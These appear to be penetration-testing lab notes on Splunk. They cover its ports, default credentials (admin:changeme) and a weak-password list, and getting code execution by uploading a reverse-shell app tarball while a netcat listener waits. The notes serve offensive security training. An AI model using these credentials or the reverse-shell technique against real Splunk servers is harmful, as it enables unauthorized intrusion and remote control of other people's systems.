
- Splunk is often used for security monitoring and business analytics. 
- Splunkd httpd service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.
- The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication.
- https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html

## Enumeration

- On older versions of Splunk, the default credentials are admin:changeme, which are conveniently displayed on the login page.
- Weak creds: admin, Welcome, Welcome1, Password123

## Attacking

**Code Execution**

- Shell:`https://github.com/0xjpuff/reverse_shell_splunk/tree/master`

```
L3pr3ch4un@htb[/htb]$ tree splunk_shell/splunk_shell/
├── bin
└── default

2 directories, 0 files
```

- The bin directory will contain any scripts that we intend to run
- default directory will have our inputs.conf file.

`L3pr3ch4un@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/`

`sudo nc -lnvp 443`

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FNF4Wpa0IBpoT3qGHQUaM%2Fimage.png?alt=media&token=0d3a9f55-b800-4c67-92de-0c1a38bdbbe0)

On the Upload app page, click on browse, choose the tarball we created earlier and click Upload.


